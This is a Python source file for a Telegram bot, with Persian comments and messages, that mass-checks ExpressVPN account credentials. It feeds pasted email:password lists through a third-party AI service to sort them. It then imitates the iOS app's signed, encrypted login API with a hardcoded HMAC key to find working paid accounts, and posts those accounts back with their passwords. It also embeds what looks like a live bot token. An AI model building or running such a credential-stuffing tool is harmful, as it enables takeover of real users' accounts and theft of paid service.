import logging
import json
import base64
import gzip
import hashlib
import hmac
import random
import string
import html
import asyncio
import os
import threading
from datetime import datetime
from io import BytesIO

# Flask برای زنده نگه داشتن ربات در Render
from flask import Flask

# Telegram Imports
from telegram import Update
from telegram.constants import ParseMode
from telegram.ext import ApplicationBuilder, ContextTypes, CommandHandler, MessageHandler, filters
from telegram.error import BadRequest

# Requests & Crypto Imports
import requests
from Crypto.Cipher import AES, PKCS1_v1_5, DES3
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from asn1crypto import cms, x509, keys

# --- CONFIGURATION ---
BOT_TOKEN = "8457154975:AAFIwf-zuCFQ0V7p1oUwJNmTKLV6-ReChe4"
AI_API_URL = "https://mionapi.ir/api/ai/gemini.php?q="

# تنظیمات زمانی
CHECK_TIMEOUT = 20
SLEEP_DELAY = 3

# تنظیمات لاگ
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)

# --- FLASK KEEP-ALIVE SERVER (FOR RENDER) ---
app = Flask(__name__)

@app.route('/')
def home():
    return "Bot is running perfectly!"

def run_web_server():
    # دریافت پورت از متغیرهای محیطی رندر یا پیش‌فرض 8080
    port = int(os.environ.get("PORT", 8080))
    app.run(host="0.0.0.0", port=port)

# --- AI SORTER LOGIC ---

def call_ai_sorter(raw_text):
    system_prompt = (
        "You are a data extractor. Extract valid email and password pairs from the user text. "
        "The input text may have emails and passwords on separate lines or mixed with other text. "
        "Ignore all extra info like 'Plan', 'Date', etc. "
        "Output ONLY a raw list of accounts in 'email:password' format. "
        "Do not write any introduction or explanation. Just the list, one per line."
    )
    
    full_prompt = f"{system_prompt}\n\nInput Text:\n{raw_text}"
    
    try:
        params = {'text': full_prompt}
        response = requests.get(AI_API_URL, params=params, timeout=30)
        
        if response.status_code == 200:
            data = response.json()
            if data.get("ok"):
                ai_answer = data.get("text", "")
                accounts = []
                for line in ai_answer.split('\n'):
                    clean_line = line.strip()
                    if ":" in clean_line and "@" in clean_line:
                        accounts.append(clean_line)
                return accounts
            else:
                logging.error(f"AI API returned not OK: {data}")
    except Exception as e:
        logging.error(f"AI API Error: {e}")
        return []
    
    return []

# --- CORE CRYPTO & CHECKER LOGIC ---

class AesCryptographyService:
    def decrypt(self, data, key, iv):
        cipher = AES.new(key, AES.MODE_CBC, iv)
        decrypted = cipher.decrypt(data)
        padding_length = decrypted[-1]
        return decrypted[:-padding_length]

def get_byte_array(size):
    return get_random_bytes(size)

def envelope_encrypt(input_data, certificate):
    cert = x509.Certificate.load(certificate)
    issuer = cert.issuer
    serial_number = cert.serial_number
    public_key_info = cert.public_key

    if hasattr(public_key_info, 'parsed'):
        rsa_public_key = public_key_info.parsed
    else:
        rsa_public_key = keys.RSAPublicKey.load(public_key_info['public_key'].parsed.dump())

    modulus = rsa_public_key['modulus'].native
    public_exponent = rsa_public_key['public_exponent'].native
    rsa_key = RSA.construct((modulus, public_exponent))

    content_key = get_random_bytes(24)
    content_iv = get_random_bytes(8)

    pad_length = 8 - (len(input_data) % 8)
    if pad_length == 0:
        pad_length = 8
    padded_data = input_data + bytes([pad_length] * pad_length)

    cipher = DES3.new(content_key, DES3.MODE_CBC, content_iv)
    encrypted_content = cipher.encrypt(padded_data)

    cipher_rsa = PKCS1_v1_5.new(rsa_key)
    encrypted_key = cipher_rsa.encrypt(content_key)

    recipient_id = cms.IssuerAndSerialNumber({
        'issuer': issuer,
        'serial_number': serial_number
    })

    key_trans_recipient = cms.KeyTransRecipientInfo({
        'version': 0,
        'rid': cms.RecipientIdentifier(
            name='issuer_and_serial_number',
            value=recipient_id
        ),
        'key_encryption_algorithm': cms.KeyEncryptionAlgorithm({
            'algorithm': '1.2.840.113549.1.1.1',
        }),
        'encrypted_key': cms.OctetString(encrypted_key)
    })

    recipient_infos = cms.RecipientInfos([
        cms.RecipientInfo(
            name='ktri',
            value=key_trans_recipient
        )
    ])

    encrypted_content_info = cms.EncryptedContentInfo({
        'content_type': '1.2.840.113549.1.7.1',
        'content_encryption_algorithm': cms.EncryptionAlgorithm({
            'algorithm': '1.2.840.113549.3.7',
            'parameters': cms.OctetString(content_iv)
        }),
        'encrypted_content': encrypted_content
    })

    enveloped_data = cms.EnvelopedData({
        'version': 0,
        'recipient_infos': recipient_infos,
        'encrypted_content_info': encrypted_content_info
    })

    content_info = cms.ContentInfo({
        'content_type': '1.2.840.113549.1.7.3',
        'content': enveloped_data
    })

    return content_info.dump()

def gzip_data(input_string):
    input_bytes = input_string.encode('ascii')
    output_stream = BytesIO()
    with gzip.GzipFile(fileobj=output_stream, mode='wb') as gz:
        gz.write(input_bytes)
    return output_stream.getvalue()

def compute_signature(input_data, key):
    signature = hmac.new(key, input_data, hashlib.sha1).digest()
    return base64.b64encode(signature).decode('ascii')

def generate_random_string(length=64):
    return ''.join(random.choices(string.hexdigits.lower(), k=length))

def unix_time_to_date(unix_time):
    try:
        return datetime.fromtimestamp(int(unix_time)).strftime('%Y-%m-%d')
    except:
        return "N/A"

def check_expressvpn(email, password):
    account_data = {
        'email': email,
        'password': password,
        'status': 'UNKNOWN',
        'details': {}
    }

    install_id = generate_random_string(64)
    base64_iv = base64.b64encode(get_byte_array(16)).decode('ascii')
    base64_key = base64.b64encode(get_byte_array(16)).decode('ascii')

    post_data = json.dumps({
        "email": email,
        "iv": base64_iv,
        "key": base64_key,
        "password": password
    })

    cert_base64 = "MIIDXTCCAkWgAwIBAgIJALPWYfHAoH+CMA0GCSqGSIb3DQEBCwUAMEUxCzAJBgNVBAYTAkFVMRMwEQYDVQQIDApTb21lLVN0YXRlMSEwHwYDVQQKDBhJbnRlcm5ldCBXaWRnaXRzIFB0eSBMdGQwHhcNMTcxMTA5MDUwNTIzWhcNMjcxMTA3MDUwNTIzWjBFMQswCQYDVQQGEwJBVTETMBEGA1UECAwKU29tZS1TdGF0ZTEhMB8GA1UECgwYSW50ZXJuZXQgV2lkZ2l0cyBQdHkgTHRkMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAtUCqVSHRqQ5XnrnA4KEnGSLGRSHWgyOgpNzNjEUmjlO25Ojncaw0u+hHAns8I3kNPk0qFlGP7oLeZvFH8+duDF02j4yVFDHkHRGyTBe3PsYvztDVzmddtG8eBgwJ88PocBXDjJvCojfkyQ8sY4EtK3y0UDJj4uJKckVdLUL8wFt2DPj+A3E4/KgYELNXA3oUlNjFwr4kqpxeDjvTi3W4T02bhRXYXgDMgQgtLZMpf1zOpM2lfqRq6sFoOmzlBTv2qbvmcOSEz3ZamwFxoYDB86EfnKPCq6ZareO/1MWGHwxH24SoJhFmyOsvq/kPPa03GJnKtMUznTnBVhwWy7KJIwIDAQABo1AwTjAdBgNVHQ4EFgQUoKnoagA0CLOLTzDb2lQ/v/osUz0wHwYDVR0jBBgwFoAUoKnoagA0CLOLTzDb2lQ/v/osUz0wDAYDVR0TBAUwAwEB/zANBgkqhkiG9w0BAQsFAAOCAQEAmF8BLuzF0rY2T2v2jTpCiqKxXARjalSjmDJLzDTWojrurHC5C/xVB8Hg+8USHPoM4V7Hr0zE4GYT5N5V+pJp/CUHppzzY9uYAJ1iXJpLXQyRD/SR4BaacMHUqakMjRbm3hwyi/pe4oQmyg66rZClV6eBxEnFKofArNtdCZWGliRAy9P8krF8poSElJtvlYQ70vWiZVIU7kV6adMVFtmPq4stjog7c2Pu0EEylRlclWlD0r8YSuvA8XoMboYyfp+RiyixhqL1o2C1JJTjY4S/t+UvQq5xTsWun+PrDoEtupjto/0sRGnD9GB5Pe0J2+VGbx3ITPStNzOuxZ4BXLe7YA=="
    cert_bytes = base64.b64decode(cert_base64)
    gzipped_data = gzip_data(post_data)

    try:
        encrypted_post_data = envelope_encrypt(gzipped_data, cert_bytes)
    except Exception:
        account_data['status'] = 'Encryption Error'
        return account_data

    hmac_key = "@~y{T4]wfJMA},qG}06rDO{f0<kYEwYWX'K)-GOyB^exg;K_k-J7j%$)L@[2me3~"
    
    header_raw = f"POST /apis/v2/credentials?client_version=11.5.2&installation_id={install_id}&os_name=ios&os_version=14.4"
    header_signature = compute_signature(header_raw.encode('ascii'), hmac_key.encode('ascii'))
    post_data_signature = compute_signature(encrypted_post_data, hmac_key.encode('ascii'))

    url = f"https://www.expressapisv2.net/apis/v2/credentials?client_version=11.5.2&installation_id={install_id}&os_name=ios&os_version=14.4"
    headers = {
        "User-Agent": "xvclient/v21.21.0 (ios; 14.4) ui/11.5.2",
        "Content-Type": "application/octet-stream",
        "X-Body-Compression": "gzip",
        "X-Signature": f"2 {header_signature} 91c776e",
        "X-Body-Signature": f"2 {post_data_signature} 91c776e",
        "Accept-Language": "en",
        "Accept-Encoding": "gzip, deflate"
    }

    try:
        response = requests.post(url, data=encrypted_post_data, headers=headers, timeout=CHECK_TIMEOUT)

        if response.status_code == 200:
            try:
                aes_service = AesCryptographyService()
                decrypted_response = aes_service.decrypt(
                    response.content,
                    base64.b64decode(base64_key),
                    base64.b64decode(base64_iv)
                )
                response_body = decrypted_response.decode('ascii')
                response_json = json.loads(response_body)
            except Exception:
                account_data['status'] = 'Decryption Failed'
                return account_data

            access_token = response_json.get("access_token")
            
            if access_token:
                sub_raw = f"GET /apis/v2/subscription?access_token={access_token}&client_version=11.5.2&installation_id={install_id}&os_name=ios&os_version=14.4&reason=activation_with_email"
                sub_header_signature = compute_signature(sub_raw.encode('ascii'), hmac_key.encode('ascii'))
                
                capture_body = json.dumps([{
                    "headers": {"Accept-Language": "en", "X-Signature": f"2 {sub_header_signature} 91c776e"},
                    "method": "GET",
                    "url": f"/apis/v2/subscription?access_token={access_token}&client_version=11.5.2&installation_id={install_id}&os_name=ios&os_version=14.4&reason=activation_with_email"
                }])
                
                batch_raw = f"POST /apis/v2/batch?client_version=11.5.2&installation_id={install_id}&os_name=ios&os_version=14.4"
                batch_sign = compute_signature(batch_raw.encode('ascii'), hmac_key.encode('ascii'))
                capture_sign = compute_signature(capture_body.encode('ascii'), hmac_key.encode('ascii'))

                batch_url = f"https://www.expressapisv2.net/apis/v2/batch?client_version=11.5.2&installation_id={install_id}&os_name=ios&os_version=14.4"
                batch_headers = {
                    "User-Agent": "xvclient/v21.21.0 (ios; 14.4)", "X-Body-Compression": "gzip",
                    "X-Signature": f"2 {batch_sign} 91c776e", "X-Body-Signature": f"2 {capture_sign} 91c776e",
                    "Content-Type": "application/json"
                }
                
                batch_resp = requests.post(batch_url, data=capture_body, headers=batch_headers, timeout=CHECK_TIMEOUT)
                
                if batch_resp.status_code == 200:
                    batch_data = batch_resp.json()
                    try:
                        sub_data_str = batch_data[0].get('body', '{}').replace('\\"', '"')
                        sub_json = json.loads(sub_data_str).get('subscription', {})
                        
                        account_data['details'] = {
                            'Plan': sub_json.get('billing_cycle', 'N/A'),
                            'Expire Date': unix_time_to_date(sub_json.get('expiration_time', 0)),
                            'Auto Renew': str(sub_json.get('auto_bill', False)).lower(),
                            'Payment': sub_json.get('payment_method', 'N/A')
                        }

                        exp_ts = int(sub_json.get('expiration_time', 0))
                        now_ts = int(datetime.now().timestamp())
                        days = int((exp_ts - now_ts) / 86400)
                        account_data['details']['Days Left'] = days

                        if str(sub_json.get('license_status', '')).upper() in ['ACTIVE', 'TRIAL', 'PAID'] and days > 0:
                            account_data['status'] = 'PREMIUM'
                        else:
                            account_data['status'] = 'EXPIRED'
                    except:
                        account_data['status'] = 'PARSE_ERROR'
                else:
                    account_data['status'] = 'SUB_CHECK_FAIL'
            else:
                 account_data['status'] = 'NO_TOKEN'

        elif response.status_code == 401:
            account_data['status'] = 'BAD_LOGIN' 
        elif response.status_code == 429:
            account_data['status'] = 'RATE_LIMIT'
        else:
            account_data['status'] = 'HTTP_ERROR'
    except:
        account_data['status'] = 'CONNECTION_ERROR'

    return account_data

# --- TELEGRAM HANDLERS ---

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    welcome_text = (
        "🤖 <b>به ربات مولتی‌چکر دقیق ExpressVPN خوش آمدید!</b>\n\n"
        "📥 <b>نحوه استفاده:</b>\n"
        "لیست اکانت‌ها را به هر شکلی که دارید بفرستید. (حتی درهم و برهم)\n\n"
        "⚙️ <b>تنظیمات فعلی:</b>\n"
        f"⏱ وقفه بین چک: {SLEEP_DELAY} ثانیه\n"
        f"⌛️ تایم‌اوت سرور: {CHECK_TIMEOUT} ثانیه\n\n"
        "🔹 مرتب‌سازی هوشمند با هوش مصنوعی Grok\n"
        "🔹 نمایش لحظه‌ای اکانت در حال بررسی\n"
        "🔹 ارسال فایل لاگ کامل برای اکانت‌های خراب\n"
    )
    await update.message.reply_text(welcome_text, parse_mode=ParseMode.HTML)

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_text = update.message.text
    if not user_text:
        return

    status_msg = await update.message.reply_text("🧠 <b>در حال پردازش هوش مصنوعی (Grok) و مرتب‌سازی...</b>", parse_mode=ParseMode.HTML)

    try:
        sorted_accounts = await asyncio.to_thread(call_ai_sorter, user_text)
    except Exception as e:
        await status_msg.edit_text(f"❌ خطا در هوش مصنوعی: {e}")
        return

    if not sorted_accounts:
        await status_msg.edit_text("❌ هیچ اکانت معتبری (email:pass) یافت نشد.")
        return

    total_accs = len(sorted_accounts)
    await status_msg.edit_text(f"✅ <b>تعداد {total_accs} اکانت پیدا شد.</b>\n🐢 شروع عملیات آرام و دقیق...", parse_mode=ParseMode.HTML)

    good_hits = 0
    bad_hits = 0
    bad_accounts_list = []

    # اضافه کردن هدر به فایل لاگ
    bad_accounts_list.append("=== Bad/Expired Accounts Log ===")
    bad_accounts_list.append(f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    bad_accounts_list.append("Format: Email:Password | Status Code\n")

    for index, account_str in enumerate(sorted_accounts, 1):
        if ":" not in account_str: 
            continue
            
        email, password = account_str.split(":", 1)
        email = email.strip()
        password = password.strip()

        # نمایش زنده ایمیل در حال بررسی
        try:
            await status_msg.edit_text(
                f"🔄 <b>در حال بررسی ({index}/{total_accs}):</b>\n"
                f"👤 <code>{email}</code>\n"
                f"------------------\n"
                f"✅ سالم: {good_hits} | ❌ خراب: {bad_hits}",
                parse_mode=ParseMode.HTML
            )
        except BadRequest:
            pass 

        # بررسی اکانت
        result = await asyncio.to_thread(check_expressvpn, email, password)
        status = result['status']
        details = result['details']
        
        safe_email = html.escape(email)
        safe_pass = html.escape(password)

        if status == 'PREMIUM':
            good_hits += 1
            hit_msg = (
                f"💎 <b>ExpressVPN Hit!</b>\n"
                f"➖➖➖➖➖➖➖➖\n"
                f"📧 <code>{safe_email}</code>\n"
                f"🔑 <code>{safe_pass}</code>\n"
                f"➖➖➖➖➖➖➖➖\n"
                f"📅 Plan: <b>{details.get('Plan', 'N/A')}</b>\n"
                f"⏳ Days: <b>{details.get('Days Left', 'N/A')}</b>\n"
                f"💳 Method: {details.get('Payment', 'N/A')}\n"
                f"🔄 Renew: {details.get('Auto Renew', 'N/A')}"
            )
            await context.bot.send_message(chat_id=update.effective_chat.id, text=hit_msg, parse_mode=ParseMode.HTML)
        else:
            bad_hits += 1
            bad_accounts_list.append(f"{email}:{password} | Status: {status}")
        
        await asyncio.sleep(SLEEP_DELAY)

    # پایان عملیات
    final_text = (
        f"🏁 <b>پایان بررسی!</b>\n\n"
        f"📊 کل اکانت‌ها: {total_accs}\n"
        f"✅ سالم: {good_hits}\n"
        f"❌ خراب: {bad_hits}\n\n"
        f"📥 فایل جزئیات اکانت‌های خراب در حال ارسال است..."
    )
    await status_msg.edit_text(final_text, parse_mode=ParseMode.HTML)

    if len(bad_accounts_list) > 3:
        bad_text_content = "\n".join(bad_accounts_list)
        file_obj = BytesIO(bad_text_content.encode('utf-8'))
        file_obj.name = f"Bad_Accounts_{datetime.now().strftime('%H%M')}.txt"
        
        await context.bot.send_document(
            chat_id=update.effective_chat.id,
            document=file_obj,
            caption="❌ لیست اکانت‌های خراب جهت بررسی پسوردها"
        )
    else:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="🎉 تبریک! هیچ اکانت خرابی وجود نداشت.")

# --- MAIN EXECUTION ---

if __name__ == '__main__':
    # اجرای وب‌سرور در یک ترد جداگانه
    # این کار باعث می‌شود Render پورت را باز ببیند و سرویس را نبندد
    web_thread = threading.Thread(target=run_web_server)
    web_thread.daemon = True
    web_thread.start()
    
    print("Bot is starting...")
    application = ApplicationBuilder().token(BOT_TOKEN).build()
    
    application.add_handler(CommandHandler('start', start))
    application.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), handle_message))
    
    application.run_polling()